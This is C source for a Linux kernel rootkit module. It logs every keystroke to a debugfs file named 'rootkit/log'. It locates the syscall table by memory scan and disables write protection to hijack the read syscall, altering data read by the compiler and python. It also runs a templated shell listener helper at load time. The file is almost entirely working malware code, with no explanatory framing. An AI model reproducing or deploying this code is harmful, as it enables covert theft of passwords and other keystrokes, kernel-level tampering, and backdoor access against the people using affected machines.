#include<linux/init.h>
#include<linux/module.h>
#include<linux/kmod.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <asm/paravirt.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <asm/uaccess.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

#define BUF_LEN (PAGE_SIZE << 2)
#define CHUNK_LEN 12
#define US  0
#define HEX 1
#define DEC 2
#define SHELL "SHELL_TEMPLATE"
#define CLEANUP "CLEAN_TEMPLATE"

MODULE_LICENSE("GPL");

static int codes;
static struct dentry *file;
static struct dentry *subdir;
unsigned long **sys_call_table;
unsigned long original_cr0;
asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);

module_param(codes, int, 0644);
MODULE_PARM_DESC(codes, "log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes)");

static ssize_t keys_read(struct file *filp,
		char *buffer,
		size_t len,
		loff_t *offset);
static int keysniffer_cb(struct notifier_block *nblock,
		unsigned long code,
		void *_param);

static const char *us_keymap[][2] = {
			{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
			{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
			{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
			{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},
			{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
			{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},
			{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},
			{"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"a", "A"}, {"s", "S"},
			{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
			{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},
			{"'", "\""}, {"`", "~"}, {"_SHIFT_", "_SHIFT_"}, {"\\", "|"},
			{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},
			{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},
			{".", ">"}, {"/", "?"}, {"_SHIFT_", "_SHIFT_"}, {"_PRTSCR_", "_KPD*_"},
			{"_ALT_", "_ALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
			{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},
			{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},
			{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},
			{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"},
			{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},
			{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},
			{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"},
			{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},
			{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},
			{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
			{"\0", "\0"}, {"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"/", "/"},
			{"_PRTSCR_", "_PRTSCR_"}, {"_ALT_", "_ALT_"}, {"\0", "\0"},
			{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},
			{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
			{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},
			{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
			{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
			{"_PAUSE_", "_PAUSE_"},                                           
};

static size_t buf_pos;
static char keys_buf[BUF_LEN] = {0};

const struct file_operations keys_fops = {
	.owner = THIS_MODULE,
	.read = keys_read,
};

static ssize_t keys_read(struct file *filp,
			 char *buffer,
			 size_t len,
			 loff_t *offset)
{
	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}

static struct notifier_block keysniffer_blk = {
	.notifier_call = keysniffer_cb,
};

void keycode_to_string(int keycode, int shift_mask, char *buf, int type)
{
	switch (type) {
	case US:
		if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
			const char *us_key = (shift_mask == 1)
			? us_keymap[keycode][1]
			: us_keymap[keycode][0];

			snprintf(buf, CHUNK_LEN, "%s", us_key);
		}
		break;
	case HEX:
		if (keycode > KEY_RESERVED && keycode < KEY_MAX)
			snprintf(buf, CHUNK_LEN, "%x %x", keycode, shift_mask);
		break;
	case DEC:
		if (keycode > KEY_RESERVED && keycode < KEY_MAX)
			snprintf(buf, CHUNK_LEN, "%d %d", keycode, shift_mask);
		break;
	}
}

int keysniffer_cb(struct notifier_block *nblock,
		  unsigned long code,
		  void *_param)
{
	size_t len;
	char keybuf[CHUNK_LEN] = {0};
	struct keyboard_notifier_param *param = _param;

	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
		 code, param->down, param->shift, param->value);

	if (!(param->down))
		return NOTIFY_OK;

	keycode_to_string(param->value, param->shift, keybuf, codes);
	len = strlen(keybuf);

	if (len < 1)
		return NOTIFY_OK;

	if ((buf_pos + len) >= BUF_LEN) {
		memset(keys_buf, 0, BUF_LEN);
		buf_pos = 0;
	}

	strncpy(keys_buf + buf_pos, keybuf, len);
	buf_pos += len;
	keys_buf[buf_pos++] = '\n';
	pr_debug("%s\n", keybuf);

	return NOTIFY_OK;
}

static int keylog_start(void)
{
	buf_pos = 0;

	if (codes < 0 || codes > 2)
		return -EINVAL;

	subdir = debugfs_create_dir("rootkit", NULL);
	if (IS_ERR(subdir))
		return PTR_ERR(subdir);
	if (!subdir)
		return -ENOENT;

	file = debugfs_create_file("log", 0400, subdir, NULL, &keys_fops);
	if (!file) {
		debugfs_remove_recursive(subdir);
		return -ENOENT;
	}

	register_keyboard_notifier(&keysniffer_blk);
	return 0;
}

static void keylog_stop(void)
{
	unregister_keyboard_notifier(&keysniffer_blk);
	debugfs_remove_recursive(subdir);
}



static int start_listener(void){
	char *argv[] = { SHELL, NULL, NULL };
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int kill_listener(void){
	char *argv[] = { CLEANUP, NULL, NULL };
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{

    long ret;
    ret = ref_sys_read(fd, buf, count);
    if (ret >= 6 && fd > 2) {

        if (strcmp(current->comm, "cc1") == 0 ||
            strcmp(current->comm, "python") == 0) {

            long i;

            char *kernel_buf;
            if (count > PAGE_SIZE) {
                printk("kmalloc error > %lu B (%lu)\n", PAGE_SIZE, count);
                return ret;
            }
            kernel_buf = kmalloc(count, GFP_KERNEL);
            if (!kernel_buf) {
                printk("Memory allocation error :(\n");
                return ret;
            }
            if(copy_from_user(kernel_buf, buf, count)) {
                printk("Read buffer copy failed :(\n");
                kfree(kernel_buf);
                return ret;
            }

            for (i = 0; i < (ret - 6); i++) {
                if (kernel_buf[i] == 'W' &&
                    kernel_buf[i+1] == 'o' &&
                    kernel_buf[i+2] == 'r' &&
                    kernel_buf[i+3] == 'l' &&
                    kernel_buf[i+4] == 'd' &&
                    kernel_buf[i+5] == '!') {
                    kernel_buf[i] = 'M';
                    kernel_buf[i+1] = 'r';
                    kernel_buf[i+2] = 'r';
                    kernel_buf[i+3] = 'r';
                    kernel_buf[i+4] = 'g';
                    kernel_buf[i+5] = 'n';
                }
            }

            if(copy_to_user(buf, kernel_buf, count))
                printk("Read buffer write failed :(\n");
            kfree(kernel_buf);
        }
    }
    return ret;
}

static unsigned long **aquire_sys_call_table(void)
{
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;
    printk("Starting syscall table scan from: %lx\n", offset);
    while (offset < ULLONG_MAX) {
        sct = (unsigned long **)offset;

        if (sct[__NR_close] == (unsigned long *) sys_close) {
            printk("Syscall table found at: %lx\n", offset);
            return sct;
        }

        offset += sizeof(void *);
    }
    return NULL;
}

static int syscall_hijack_start(void)
{
	if(!(sys_call_table = aquire_sys_call_table()))
			return -1;

	original_cr0 = read_cr0();
	write_cr0(original_cr0 & ~0x00010000);
	ref_sys_read = (void *)sys_call_table[__NR_read];
	sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
	write_cr0(original_cr0);

	return 0;
}

static void syscall_hijack_end(void)
{
	if(!sys_call_table) {
			return;
	}
	write_cr0(original_cr0 & ~0x00010000);
	sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
	write_cr0(original_cr0);
}


static int init_mod(void){
	int ret;
	ret = syscall_hijack_start();
	if(ret != 0)
		return ret;
	ret = keylog_start();
	if(ret != 0)
		return ret;
	return start_listener();
}

static void exit_mod(void){
	syscall_hijack_end();
	kill_listener();
	keylog_stop();
	return;
}
module_init(init_mod);
module_exit(exit_mod);
